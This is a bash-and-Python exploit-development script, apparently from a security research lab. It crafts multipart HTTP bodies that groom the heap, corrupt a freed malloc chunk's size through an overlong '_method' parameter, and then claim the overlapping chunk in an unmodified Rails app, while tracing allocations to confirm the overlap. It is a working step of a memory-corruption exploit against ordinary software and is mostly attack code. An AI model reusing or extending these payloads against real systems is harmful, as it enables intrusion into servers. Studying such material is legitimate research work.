#!/bin/bash
# Shrink-family CLAIM experiment (wall 2026-11-25 fourth batch, named next):
# after the 0x53 byte corrupts a binned victim's size on the unmodified
# `rails new --minimal` app, does a LATER matched-class benign multipart
# request POP the corrupted chunk (the overlap consumer), when the victim
# class is made plantable by a benign first request?
#
# Per fresh process, loopback only, analysis instrumentation only:
#   PLANT  benign multipart (parts >=809B, no _method)   -> value/slice frees
#   ATTACK consH20-tail N body (the td588 geometry)     -> 0x53 size rewrite
#   CLAIM  benign parts sized to candidate shrunk classes-> pop at the victim
#   /up alive check, maps snapshot outside the request path, kill.
# Case probe + full M/F stream run together (case_only unset). No command,
# no persistence, no grade change.
#
# Usage:
#   RUBY2SHELL_CLAIM_N=588  bash lab/repro/ruby2shell-shrink-claim.sh
#   RUBY2SHELL_CLAIM_N=892  RUBY2SHELL_CLAIM_TAG=sc892 \
#     RUBY2SHELL_CLAIM_PARTS=824,2616,3032,3896,32312 \
#     bash lab/repro/ruby2shell-shrink-claim.sh
set -u
cd "$(dirname "$0")/../.." || exit 1
EV=lab/build/evidence
APP=lab/build/rails-stock-app
RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
N="${RUBY2SHELL_CLAIM_N:-588}"
TAGP="${RUBY2SHELL_CLAIM_TAG:-sc588}"
PLANT_SPEC="${RUBY2SHELL_CLAIM_PLANT:-946x24}"
CLAIM_LIST="${RUBY2SHELL_CLAIM_PARTS:-824,2616,3032,3896}"
COUNT="${RUBY2SHELL_CLAIM_COUNT:-12}"
GAP="${RUBY2SHELL_CLAIM_GAP:-0}"
BASE=4810
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
PFX="$EV/stock-rails-$TAGP"

if [ "${1:-}" = "--one" ]; then
  i="$2"; PORT=$((BASE + i)); TAG="$TAGP-$i"
  LOG="$EV/stock-rails-$TAG.server.log"
  PIDF="$PWD/$EV/stock-rails-$TAG.pid"
  ARM="$PWD/$EV/stock-rails-$TAGP.case-arm"
  rm -f "$ARM"
  MTRACE_FD=2 MTRACE_FREE_DUMP=1 MTRACE_CASE_REQUEST=$((N + 44)) \
    MTRACE_CASE_ARM_FILE="$ARM" MTRACE_EMIT_ARM_FILE="$ARM" \
    LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDF" \
    > "$LOG" 2>&1 &
  PID=$!
  READY=NO
  for _ in $(seq 1 300); do
    curl -s -m 1 "http://127.0.0.1:$PORT/up" >/dev/null 2>&1 && { READY=YES; break; }
    sleep 0.1
  done
  if [ "$READY" != YES ]; then
    echo "$TAG boot-fail" >> "$PFX.summary"
    kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null; exit 0
  fi
  touch "$ARM"
  if [ "${RUBY2SHELL_CLAIM_NO_PLANT:-0}" = 1 ]; then
    P1=NA
  else
    P1=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
      -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
      --data-binary "@$PFX.plant.body" -o "$EV/stock-rails-$TAG.plant.html" \
      -w '%{http_code}' 2>>"$LOG")
    [ "$GAP" != 0 ] && sleep "$GAP"
  fi
  P2=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$PFX.attack.body" -o "$EV/stock-rails-$TAG.attack.html" \
    -w '%{http_code}' 2>>"$LOG")
  P3=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$PFX.claim.body" -o "$EV/stock-rails-$TAG.claim.html" \
    -w '%{http_code}' 2>>"$LOG")
  rm -f "$ARM"
  A1=$(curl -s -m 5 "http://127.0.0.1:$PORT/up" -o /dev/null -w '%{http_code}' 2>>"$LOG")
  ALIVE=NO
  if kill -0 "$PID" 2>/dev/null; then
    ALIVE=YES
    cat "/proc/$PID/maps" > "$EV/stock-rails-$TAG.maps" 2>/dev/null
    kill "$PID" 2>/dev/null
  fi
  wait "$PID" 2>/dev/null
  echo "$TAG plant=$P1 attack=$P2 claim=$P3 up=$A1 alive=$ALIVE" >> "$PFX.summary"
  exit 0
fi

if [ ! -f "$APP/config/environment.rb" ]; then
  echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
  exit 2
fi
if [ ! -x "$RB" ]; then
  echo "missing plain ruby build $RB" >&2
  exit 2
fi

rm -f "$PFX".*.body "$EV"/stock-rails-"$TAGP"-*.{server.log,html,maps,pid} \
      "$PFX.summary" "$EV"/stock-rails-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null

EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" CLAIM_LIST="$CLAIM_LIST" \
python3 - "$N" <<'PY'
import sys, os
n = int(sys.argv[1])
ev, tag = os.environ['EV_DIR'], os.environ['TAG']
def part(name, content, ctype):
    return (b'--XB\r\nContent-Disposition: form-data; name="' + name +
            b'"\r\nContent-Type: ' + ctype + b'\r\n\r\n' + content)
AB = b'text/plain; charset=ASCII-8BIT'
pattern = (0x250).to_bytes(8, 'little') + (0x90).to_bytes(8, 'little')
drain = (pattern * ((1024 + 15) // 16))[:1024]
parts = [part(f'd{i}'.encode(), drain, AB) for i in range(32)]
method = b'a' + b'\xdf' * (n - 5) + b'\x00\x00\x51\x02'
parts.append(part(b'_method', method, b'text/plain; charset=ISO-8859-1'))
parts.append(part(b'f', (pattern * 16)[:256], AB))
open(f'{ev}/stock-rails-{tag}.attack.body', 'wb').write(
    b'\r\n'.join(parts) + b'\r\n--XB--\r\n')
def strip_content(fill, size):
    # value-buffer content with a sane fake "next chunk" header at the
    # 0x350 dead-strip offset (unsorted/consolidation consumers read it)
    if size >= 864:
        return (fill * 848 + (0).to_bytes(8, 'little') +
                (0x91).to_bytes(8, 'little') + fill * (size - 864))
    return fill * size
pp = []
for grp in os.environ['PLANT_SPEC'].split(','):
    if not grp:
        continue
    size, count = (int(v, 0) for v in grp.split('x'))
    for _ in range(count):
        pp.append(part(f'p{len(pp)}'.encode(), strip_content(b'p', size), AB))
open(f'{ev}/stock-rails-{tag}.plant.body', 'wb').write(
    b'\r\n'.join(pp) + b'\r\n--XB--\r\n')
cp = []
for v in os.environ['CLAIM_LIST'].split(','):
    if not v:
        continue
    size = int(v, 0)
    cp.append(part(f'c{len(cp)}'.encode(), strip_content(b'Z', size), AB))
open(f'{ev}/stock-rails-{tag}.claim.body', 'wb').write(
    b'\r\n'.join(cp) + b'\r\n--XB--\r\n')
PY

# geometry check: at N=588 the attack body must be byte-identical to the
# surviving chosen-header forge run's wire input (cov-n588 family)
if [ "$N" = 588 ] && [ -f "$EV/stock-rails-cov-n588-18.body" ]; then
  if ! cmp -s "$PFX.attack.body" "$EV/stock-rails-cov-n588-18.body"; then
    echo "attack body at N=588 does not match the cov-n588 geometry; aborting" >&2
    exit 2
  fi
fi

seq 1 "$COUNT" | xargs -P6 -I{} "$0" --one {}

TAG="$TAGP" N="$N" CLAIM_LIST="$CLAIM_LIST" \
python3 - <<'PY'
import glob, os, re, sys
tag = os.environ['TAG']
n = int(os.environ['N'])
claim_reqs = {int(v, 0) + 9 for v in os.environ['CLAIM_LIST'].split(',') if v}
rows = []
for logf in sorted(glob.glob(f'lab/build/evidence/stock-rails-{tag}-*.server.log'),
                    key=lambda p: int(re.search(r'-(\d+)\.server\.log$', p).group(1))):
    run = re.search(r'-(\d+)\.server\.log$', logf).group(1)
    text = open(logf, errors='replace').read()
    lines = text.splitlines()
    bs = [l for l in lines if l.startswith('B ')]
    as_ = [l for l in lines if l.startswith('A ')]
    victim = size_b = size_a = None
    if bs:
        b = bs[-1]
        victim = re.search(r'victim=(0x[0-9a-f]+)', b).group(1)
        size_b = re.search(r'size=(0x[0-9a-f]+)', b).group(1)
    if as_:
        size_a = re.search(r'size=(0x[0-9a-f]+)', as_[-1]).group(1)
    # claim pops at the victim: M or C lines with matching ptr + request
    claimed = []
    other_pops = []
    for l in lines:
        m = re.match(r'^M (\d+) ([0-9a-f]+) ([0-9a-f]+) ([0-9a-f]+)', l)
        if m and victim and ('0x' + m.group(3)) == victim:
            req = int(m.group(2), 16)
            (claimed if req in claim_reqs else other_pops).append(hex(req))
        m = re.match(r'^C tid=\d+ request=(0x[0-9a-f]+) ptr=(0x[0-9a-f]+)', l)
        if m and m.group(2) == victim:
            req = int(m.group(1), 16)
            (claimed if req in claim_reqs else other_pops).append(hex(req))
    plantfrees = sum(1 for l in lines if l.startswith('D ')
                     and re.search(r' (0x3d1|0x411) ', l))
    # plant free timing relative to the attack B line
    pre = True
    freed_pre = freed_post = 0
    for l in lines:
        if l.startswith('B '):
            pre = False
        if l.startswith('D ') and re.search(r' (0x3d1|0x411) ', l):
            if pre: freed_pre += 1
            else: freed_post += 1
    abort = ''
    for pat in ('corrupted', 'munmap', 'malloc():', 'Assertion', 'SIGABRT',
                'invalid pointer', 'invalid next size', 'double free'):
        for l in lines:
            if pat in l:
                abort = l.strip()[:110]
                break
        if abort:
            break
    # excerpt: probe lines, victim-adjacent traffic, abort context
    keep = []
    for i, l in enumerate(lines):
        if (l[:2] in ('B ', 'A ', 'V ', 'C ', 'P ', 'Q ', 'G ', 'H ') or
                l.startswith('D ') or l.startswith('M ') or l.startswith('F ') or
                'Started POST' in l or 'Completed' in l or
                'corrupted' in l or 'munmap' in l or 'malloc():' in l or
                'Assertion' in l or 'SIGABRT' in l or 'rails' in l.lower() and
                'Booting' in l):
            if l.startswith('M ') or l.startswith('F '):
                m = re.match(r'^[MF] (\d+) ([0-9a-f]+) ([0-9a-f]+)', l)
                if m and victim:
                    ptr = '0x' + m.group(3)
                    sz = int(m.group(2), 16)
                    near = (abs(int(ptr, 16) - int(victim, 16)) < 0x10000)
                    if not near and sz not in claim_reqs and sz > 0x500:
                        continue
            keep.append(l)
    open(logf.replace('.server.log', '.excerpt.txt'), 'w').write('\n'.join(keep) + '\n')
    rows.append((run, victim, size_b, size_a, claimed, other_pops,
                 freed_pre, freed_post, abort))
    # raw log kept for review; trim after the table is read (td588 policy)
print(f"== {tag}: N={n} claim_reqs={[hex(r) for r in sorted(claim_reqs)]}")
print("run victim            B-size  A-size  claim  other-pops  plantD(pre/post) alive-line  abort")
for r in rows:
    print(f"{r[0]:>3} {str(r[1]):>17} {str(r[2]):>7} {str(r[3]):>7} "
          f"{len(r[4]):>3} {len(r[5]):>5} {r[6]:>2}/{r[7]:<2} {r[8][:70]}")
    if r[4]:
        print(f"    claimed-reqs: {sorted(set(r[4]))}")
    if r[5]:
        print(f"    other-reqs:   {sorted(set(r[5]))[:8]}")
print("-- per-run result lines:")
summ = f'lab/build/evidence/stock-rails-{tag}.summary'
if os.path.exists(summ):
    print(open(summ).read().rstrip())
PY
